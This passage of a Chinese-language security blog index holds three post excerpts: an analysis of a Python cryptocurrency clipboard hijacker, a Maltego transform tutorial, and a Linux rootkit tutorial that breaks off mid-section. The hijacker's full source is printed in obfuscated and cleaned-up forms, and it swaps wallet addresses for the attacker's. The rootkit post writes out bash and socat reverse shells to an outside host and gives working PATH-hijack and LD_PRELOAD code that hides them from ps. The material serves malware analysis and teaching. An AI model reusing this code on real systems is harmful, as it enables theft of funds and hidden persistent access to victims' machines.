<figure class="highlight python"><figcaption><span>8.61.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.2</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.15 (default, Dec 23 2019, 14:00:59) </span></span><br><span class="line"><span class="comment"># [GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)]</span></span><br><span class="line"><span class="comment"># Embedded file name: 8.61.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2020-08-15 23:23:49</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">oo000 = sys.version_info[<span class="number">0</span>] == <span class="number">2</span></span><br><span class="line">ii = <span class="number">2048</span></span><br><span class="line">oOOo = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">O0</span>(<span class="params">ll_opy_</span>):</span><br><span class="line">    o0O = <span class="built_in">ord</span>(ll_opy_[(-<span class="number">1</span>)])</span><br><span class="line">    iI11I1II1I1I = ll_opy_[:-<span class="number">1</span>]</span><br><span class="line">    oooo = o0O % <span class="built_in">len</span>(iI11I1II1I1I)</span><br><span class="line">    iIIii1IIi = iI11I1II1I1I[:oooo] + iI11I1II1I1I[oooo:]</span><br><span class="line">    <span class="keyword">if</span> oo000:</span><br><span class="line">        o0OO00 = unicode().join([ unichr(<span class="built_in">ord</span>(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) <span class="keyword">for</span> i1iII1IiiIiI1, oo <span class="keyword">in</span> <span class="built_in">enumerate</span>(iIIii1IIi) ])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        o0OO00 = <span class="built_in">str</span>().join([ <span class="built_in">chr</span>(<span class="built_in">ord</span>(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) <span class="keyword">for</span> i1iII1IiiIiI1, oo <span class="keyword">in</span> <span class="built_in">enumerate</span>(iIIii1IIi) ])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(o0OO00)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time, re, pyperclip, subprocess</span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">    ooOoO0O00 * IIiIiII11i</span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">    oOo0O0Ooo * I1ii11iIi11i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">I1IiI</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            o0OOO = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">                ooOo + Oo</span><br><span class="line">            o0OIiiIII111iI = subprocess.Popen([<span class="string">&#x27;C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#x27;</span>, <span class="string">&#x27;Get-Clipboard&#x27;</span>], stdout=subprocess.PIPE, startupinfo=IiII)</span><br><span class="line">            o0OOO = <span class="built_in">str</span>(o0OIiiIII111iI.stdout.read()).strip().decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">u&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> o0OOO != iI1Ii11111iIi <span class="keyword">and</span> o0OOO != i1i1II:</span><br><span class="line">                <span class="keyword">if</span> re.match(O0oo0OO0, <span class="built_in">str</span>(o0OOO)):</span><br><span class="line">                    pyperclip.copy(iI1Ii11111iIi)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">                <span class="keyword">elif</span> re.match(I1i1iiI1, <span class="built_in">str</span>(o0OOO)):</span><br><span class="line">                    pyperclip.copy(i1i1II)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> iiIIIII1i1iI:</span><br><span class="line">            <span class="built_in">print</span>(iiIIIII1i1iI)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">            o00ooo0 / Oo00O0</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == O0(<span class="string">u&#x27;\u0829\u0862\u0863\u0872\u0867\u0869\u086f\u0861\u0862\u082b\u0805&#x27;</span>):</span><br><span class="line">    i1i1II = <span class="string">&#x27;0x22f338FC26Ea71EC884256C29103122c4578EE27&#x27;</span></span><br><span class="line">    iI1Ii11111iIi = <span class="string">&#x27;14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS&#x27;</span></span><br><span class="line">    O0oo0OO0 = <span class="string">&#x27;^[13][a-km-zA-HJ-NP-Z1-9]&#123;25,34&#125;$&#x27;</span></span><br><span class="line">    I1i1iiI1 = <span class="string">&#x27;^(0x)?[0-9a-fA-F]&#123;40&#125;$&#x27;</span></span><br><span class="line">    time.sleep(<span class="number">15</span>)</span><br><span class="line">    IiII = subprocess.STARTUPINFO()</span><br><span class="line">    IiII.dwFlags |= subprocess.STARTF_USESHOWWINDOW</span><br><span class="line">    I1IiI()</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">        o0oooOoO0</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">        IiIii1Ii1IIi / O0Oooo00.oo00 * I11</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">        I1111 * o0o0Oo0oooo0 / I1I1i1 * oO0 / IIIi1i1I</span><br><span class="line"><span class="comment"># okay decompiling 8.61.py.pyc</span></span><br></pre></td></tr></table></figure>
<p>有稍微混淆過的原始碼，重新命名一下變數就可以了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> time, re, pyperclip, subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            clipboard = <span class="literal">None</span></span><br><span class="line">            process = subprocess.Popen([<span class="string">&#x27;C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#x27;</span>, <span class="string">&#x27;Get-Clipboard&#x27;</span>], stdout=subprocess.PIPE, startupinfo=startupinfo)</span><br><span class="line">            clipboard = <span class="built_in">str</span>(process.stdout.read()).strip().decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">u&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> clipboard != btc_address <span class="keyword">and</span> clipboard != eth_address:</span><br><span class="line">                <span class="keyword">if</span> re.match(btc_address_pattern, <span class="built_in">str</span>(clipboard)):</span><br><span class="line">                    pyperclip.copy(btc_address)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">                <span class="keyword">elif</span> re.match(eth_address_pattern, <span class="built_in">str</span>(clipboard)):</span><br><span class="line">                    pyperclip.copy(eth_address)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            <span class="built_in">print</span>(err)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    eth_address = <span class="string">&#x27;0x22f338FC26Ea71EC884256C29103122c4578EE27&#x27;</span></span><br><span class="line">    btc_address = <span class="string">&#x27;14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS&#x27;</span></span><br><span class="line">    btc_address_pattern = <span class="string">&#x27;^[13][a-km-zA-HJ-NP-Z1-9]&#123;25,34&#125;$&#x27;</span></span><br><span class="line">    eth_address_pattern = <span class="string">&#x27;^(0x)?[0-9a-fA-F]&#123;40&#125;$&#x27;</span></span><br><span class="line">    time.sleep(<span class="number">15</span>)</span><br><span class="line">    startupinfo = subprocess.STARTUPINFO()</span><br><span class="line">    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>他把你剪貼簿裡面符合 bitcoin 或 ethereum 地址格式的通通換成他錢包的位址。</p>
<h2 id="IOC">IOC</h2>
<ul>
<li>0x22f338FC26Ea71EC884256C29103122c4578EE27</li>
<li>14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS</li>
</ul>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/08/16/clipboard-hijack/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-07-30T16:00:00.000Z" title="7/31/2020, 12:00:00 AM">2020-07-31</time></span><i class="material-icons">schedule</i><span class="level-item">4 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/%E9%9B%9C%E8%AB%87/">雜談</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/07/31/maltego/">【工具介紹】Maltego</a></h1><div class="content"><p>Maltego 是用來自動化情資蒐集的工具。</p>
<h2 id="基本介紹">基本介紹</h2>
<p>一開始就按 Creat a new graph 新增一個工作的圖層，就可以在上面畫出關係圖。<br>
Entities 是基本物件，有很多種類型比如 Company, Organization, Domain, Website, …，每個物件都有幾個屬性欄位，假設你拿到某個人的手機號碼，那可以從旁邊 Entity Palette 拖曳一個 Phone Number 到右邊空白處。<br>
Transforms 就是一個可以重複使用的函式，比如已經有了手機號碼，那就去某個網站上爬手機號碼對應的國家之類的，把這個爬的步驟寫成一個 transform，就可以自動化去從已知的資料生更多相關的資料。Local Transform 是自己寫的函式，也有別人寫好的在 Transform Hub 上面。</p>
<h2 id="Local-Transforms">Local Transforms</h2>
<p>跟著官方文件 <a target="_blank" rel="noopener" href="https://docs.maltego.com/support/solutions/articles/15000017605-local-transforms-example-">maltego docs</a> 做就可以大概了解怎麼用 python 去寫 Local Transforms 了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install maltego-trx</span><br><span class="line">maltego-trx start new_project</span><br></pre></td></tr></table></figure>
<p>先安裝 python 套件，再用 <code>maltego-trx</code> 去初始化一個 project</p>
<figure class="highlight python"><figcaption><span>transforms/TaxIDToCompany.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> maltego_trx.entities <span class="keyword">import</span> Person</span><br><span class="line"><span class="keyword">from</span> maltego_trx.transform <span class="keyword">import</span> DiscoverableTransform</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TaxIDToCompany</span>(<span class="title class_ inherited__">DiscoverableTransform</span>):</span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_entities</span>(<span class="params">cls, request, response</span>):</span><br><span class="line">        taxid = request.Properties[<span class="string">&#x27;properties.taxid&#x27;</span>]</span><br><span class="line">        r = requests.get(<span class="string">f&#x27;http://company.g0v.ronny.tw/api/show/<span class="subst">&#123;taxid&#125;</span>&#x27;</span>)</span><br><span class="line">        result = json.loads(r.text)</span><br><span class="line">        response.addEntity(<span class="string">&#x27;maltego.Company&#x27;</span>, result[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;公司名稱&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p>主要就是繼承 <code>DiscoverableTransform</code> 然後填寫 <code>create_entities</code> 這個函式，request 裡面就有執行 transform 的那個 entity 的資訊，然後這裡是用統一編號 ( TaxID ) 去找公司名稱，然後新增一個公司的 Entity。<br>
原本沒有 TaxID 這個 Entity 要先去 New Entity Type 新增一個 TaxID。<br>
<code>company.g0v.ronny.tw</code> 回傳的資訊有很多，可以把那些資訊都加進來，可是我就懶。</p>
<p>寫完之後要把 Local Transform 加進去，有幾個欄位要注意，</p>
<ol>
<li>Input entity type : 要填這個 transform 要對哪一種 entity 做操作</li>
<li>Command : 我們是用 python api 所以要填 python 的 PATH，在 linux 上可以用 <code>which python</code> 找</li>
<li>Parameters : 填 <code>project.py local TaxIDToCompany</code>，<code>project.py</code> 是初始化 project 完會產生的腳本，<code>local</code> 指的就是 Local Transform，<code>TaxIDToCompany</code> 是你 transform 的名字，就是那個檔名的部分吧</li>
<li>Working directory: Project 的路徑，就是要有 <code>project.py</code> 的那個地方</li>
</ol>
<p>最後按下 Run 跑完 transform 之後，就會自動新增一個 Company 的 Entity。</p>
<p align="center"><img data-src="/images/maltego-result.png" class=" lazyload"  title="maltego result"></p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/07/31/maltego/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2019-06-06T16:00:00.000Z" title="6/7/2019, 12:00:00 AM">2019-06-07</time></span><i class="material-icons">schedule</i><span class="level-item">16 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/%E9%9B%9C%E8%AB%87/">雜談</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/06/07/linux-rootkit/">【技術筆記】Linux Rootkit 隱藏程序技巧</a></h1><div class="content"><p>簡報版本 : <a target="_blank" rel="noopener" href="https://www.slideshare.net/ssuserd44fa2/rootkit-101-228943978">https://www.slideshare.net/ssuserd44fa2/rootkit-101-228943978</a></p>
<hr>
<p>root + kit 的意思就是拿到 root 權限後可以用的工具包，大多是隱藏程序的技巧，所以 rootkit 也可以理解成隱藏程序技術的通稱，不過也有些不需要 root 的隱藏程序技術，今天會逐一介紹 linux 上 rootkit 的原理與實作</p>
<h2 id="隱之呼吸壹之型-PATH-Hijack">隱之呼吸壹之型 - PATH Hijack</h2>
<h3 id="條件">條件</h3>
<p>不需要 root</p>
<h3 id="目標">目標</h3>
<p>在 <code>ps</code> 的結果中隱藏下面兩種簡單的後門</p>
<ol>
<li><code>bash -i &gt;&amp; /dev/tcp/192.168.100.100/9999 0&gt;&amp;1</code></li>
<li><code>socat TCP:192.168.100.100:9999 EXEC:/bin/bash</code></li>
</ol>
<h3 id="手法">手法</h3>
<p>假設在 <code>$PATH</code> 環境變數中 <code>/usr/local/bin</code> 在 <code>/bin</code> 前面，所以我們可以寫一個檔案在 <code>/usr/local/bin/ps</code>，這樣 <code>ps</code> 就會執行 <code>/usr/local/bin/ps</code> 而不是 <code>/bin/ps</code>，而達到 hook 程序的效果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">/bin/ps <span class="variable">$@</span> | grep -Ev <span class="string">&#x27;192.168.100.100|socat&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>grep -Ev</code> 是 inverse match</li>
<li><code>$@</code> 是傳進來的參數 ( 這裡原封不動的交給 <code>/bin/ps</code> )</li>
</ul>
<h2 id="隱之呼吸貳之型-LD-PRELOAD">隱之呼吸貳之型 - LD_PRELOAD</h2>
<h3 id="條件-2">條件</h3>
<p>不需要 root</p>
<h3 id="目標-2">目標</h3>
<p>在 <code>ps</code> 的結果中隱藏下面兩種簡單的後門</p>
<ol>
<li><code>bash -i &gt;&amp; /dev/tcp/192.168.100.100/9999 0&gt;&amp;1</code></li>
<li><code>socat TCP:192.168.100.100:9999 EXEC:/bin/bash</code></li>
</ol>
<h3 id="要-hook-哪個函式">要 hook 哪個函式</h3>
<p>首先我們可以用 <code>ltrace</code> 看 <code>ps</code> 跑起來呼叫了哪些 library 的函式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">fwrite(<span class="string">&quot; [jfsCommit]\nhe]\n4\n0\n\nstart\ngrou&quot;</span>..., <span class="number">13</span>, <span class="number">1</span>, <span class="number">0x7fbfcd303760</span>)  = <span class="number">1</span></span><br><span class="line">readproc(<span class="number">0x55e061b12f90</span>, <span class="number">0x55e0609d1540</span>, <span class="number">13</span>, <span class="number">1024</span>)                          = <span class="number">0x55e0609d1540</span></span><br><span class="line">escape_str(<span class="number">0x7fbfcd90b090</span>, <span class="number">0x55e0609d1740</span>, <span class="number">0x20000</span>, <span class="number">0x7fff6f748044</span>)         = <span class="number">4</span></span><br><span class="line"><span class="built_in">strlen</span>(<span class="string">&quot;root&quot;</span>)                                                              = <span class="number">4</span></span><br><span class="line">fwrite(<span class="string">&quot;root&quot;</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0x7fbfcd303760</span>)                                        = <span class="number">1</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>會發現 <code>readproc</code> 一直出現，查看一下 man page</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">       readproc, freeproc  - read information from next /proc/## entry</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       #include &lt;proc/readproc.h&gt;</span><br><span class="line"></span><br><span class="line">       proc_t* readproc(PROCTAB *PT, proc_t *return_buf);</span><br><span class="line">       void freeproc(proc_t *p);</span><br></pre></td></tr></table></figure>
<p>那我們就在 <code>ps</code> 的原始碼中找一下 <code>readproc</code> 的用法，如下</p>
<figure class="highlight c"><figcaption><span>procps-3.2.8/ps/display.c >331</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ptp = openproc(needs_for_format | needs_for_sort | needs_for_select | needs_for_threads);</span><br><span class="line"><span class="keyword">if</span>(!ptp) &#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error: can not access /proc.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(&amp;buf, <span class="string">&#x27;#&#x27;</span>, <span class="keyword">sizeof</span>(<span class="type">proc_t</span>));</span><br><span class="line"><span class="keyword">switch</span>(thread_flags &amp; (TF_show_proc|TF_loose_tasks|TF_show_task))&#123;</span><br><span class="line"><span class="keyword">case</span> TF_show_proc:                   <span class="comment">// normal non-thread output</span></span><br><span class="line">  <span class="keyword">while</span>(readproc(ptp,&amp;buf))&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
<details class="admonition question" open><summary>如何取得 ps 原始碼</summary><p><p><code>ps</code> 這個指令是來自 <code>procps</code>，可以從 <a target="_blank" rel="noopener" href="http://procps.sourceforge.net/">procps.sourceforge.net</a> 下載<br>
另外其他基本的 shell 指令的原始碼則可以從 <a target="_blank" rel="noopener" href="https://www.gnu.org/software/coreutils/">www.gnu.org/software/coreutils</a> 下載</p>
</p></details>
<ul>
<li>基本上就是先 <code>openproc</code> 然後再用 <code>readproc</code> 一次讀一個 process entry</li>
<li><code>ptp</code> 的型態是 <a target="_blank" rel="noopener" href="https://fossies.org/dox/procps-3.2.8/structPROCTAB.html"><code>PROCTAB*</code></a>，裡面有 linked list 的結構，讓程式能找到下一個 process</li>
<li><code>buf</code> 的型態是 <a target="_blank" rel="noopener" href="https://fossies.org/dox/procps-3.2.8/structproc__t.html"><code>proc_t*</code></a>，包含了 process 的資訊</li>
<li>那我們就去 hook <code>readproc</code> 這個函式，把想隱藏的 procss 跳過</li>
</ul>
<h3 id="dlsym">dlsym</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeof(readproc) *old_readproc = dlsym(RTLD_NEXT, <span class="string">&quot;readproc&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>這行是 <code>LD_PRELOAD</code> 技巧的關鍵，我們用 <code>dlsym</code> 這個函式來找 symbol 的位址</li>
<li>放 <code>RTLD_NEXT</code> 這個參數會找下一個 symbol 而不是第一個</li>
<li><code>typeof(readproc)</code> 只是一個語法糖，代表 <code>readproc</code> 這個 function pointer 的型態</li>
</ul>
<h3 id="POC-原始碼">POC 原始碼</h3>
<figure class="highlight c"><figcaption><span>hook.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;proc/readproc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hidden</span> <span class="params">(<span class="type">char</span> *target)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *keywords[<span class="number">2</span>] = &#123; <span class="string">&quot;192.168.100.100&quot;</span>, <span class="string">&quot;socat&quot;</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) <span class="keyword">if</span> (<span class="built_in">strstr</span>(target, keywords[i])) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">proc_t</span>* <span class="title function_">readproc</span> <span class="params">(PROCTAB *PT, <span class="type">proc_t</span> *return_buf)</span> &#123;</span><br><span class="line">    typeof(readproc) *old_readproc = dlsym(RTLD_NEXT, <span class="string">&quot;readproc&quot;</span>);</span><br><span class="line">    <span class="type">proc_t</span>* ret_value = old_readproc(PT, return_buf);</span><br><span class="line">    <span class="keyword">while</span> (ret_value</span><br><span class="line">        &amp;&amp; ret_value-&gt;cmdline</span><br><span class="line">        &amp;&amp; hidden(ret_value-&gt;cmdline[<span class="number">0</span>])) &#123;</span><br><span class="line">        ret_value = old_readproc(PT, return_buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="編譯-2">編譯</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o hook.so hook.c</span><br></pre></td></tr></table></figure>
<h3 id="執行">執行</h3>
<ul>
<li>指定 <code>LD_PRELOAD</code> 環境變數來載入編譯好的動態連結庫，但只有該次生效</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=/path/to/hook.so ps aux</span><br></pre></td></tr></table></figure>
<ul>
<li>或是編輯 <code>ld.so.preload</code>，寫入 <code>hook.so</code> 的路徑，之後每次執行都會載入，可以用 <code>ldd</code> 查看是否成功 preload</li>
</ul>
<h3 id="DEMO">DEMO</h3>
<script id="asciicast-0M5KQUVkrY4Ha0gOOSS9pj97K" src="https://asciinema.org/a/0M5KQUVkrY4Ha0gOOSS9pj97K.js" async></script>
<h2 id="隱之呼吸參之型-Loadable-Kernel-Module">隱之呼吸參之型 - Loadable Kernel Module</h2>
<h3 id="條件-3">條件</h3>
<p>需要 root</p>
<h3 id="目標-3">目標</h3>
<p>在 <code>ls</code> 的結果中隱藏 <code>rootkit.ko</code></p>
<h3 id="取得-sys-call-table">取得 sys_call_table</h3>
<p>首先因為我們要 hijack system call 所以要先取得 <code>sys_call_table</code> 的位址</p>
<h4 id="方法一">方法一</h4>
<ul>
<li>在 2.4 以前的內核版本，預設導出所有符號，所以可以直接用</li>
<li>如果自己編譯內核的話，可以修改原始碼用 <code>EXPORT_SYMBOL</code> 把 <code>sys_call_table</code> 的符號導出來</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">void</span> *sys_call_table[];</span><br></pre></td></tr></table></figure>
<h4 id="方法二">方法二</h4>
<p><code>kallsyms_lookup_name</code> 這個函式也可以抓位址，但他也不一定會被導出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kallsyms.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> **sys_call_table;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hook_init</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    sys_call_table = (<span class="type">void</span> **)kallsyms_lookup_name(<span class="string">&quot;sys_call_table&quot;</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;sys_call_table = 0x%px\n&quot;</span>, sys_call_table);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<details class="admonition question" open><summary>How to printk a pointer ?</summary><p><p>要用 printk 印出 pointer 可以用 <code>%px</code><br>
